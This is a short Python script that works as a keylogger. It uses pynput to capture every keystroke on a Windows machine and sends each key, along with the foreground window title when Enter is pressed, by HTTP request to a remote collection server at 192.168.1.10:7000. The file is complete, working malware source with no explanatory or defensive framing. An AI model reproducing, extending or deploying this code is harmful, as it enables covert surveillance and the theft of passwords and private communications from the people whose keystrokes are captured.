from pynput.keyboard import Key, Listener
import requests
from win32gui import GetWindowText, GetForegroundWindow


def on_press(key):
    try:
        window = str(GetWindowText(GetForegroundWindow()))
        
        print(str(key).replace("'", ""))
        get_res = requests.get("http://192.168.1.10:7000/keylog?data=" + str(key).replace("'", ""))

        if str(key).replace("'", "") == "Key.enter":
            get_res = requests.get("http://192.168.1.10:7000/keylog?data=" + str(window + "\x20").replace("'", ""))

    except Exception as err:
        print(str(err))
        return False

with Listener(
        on_press=on_press,) as listener:
    listener.join()



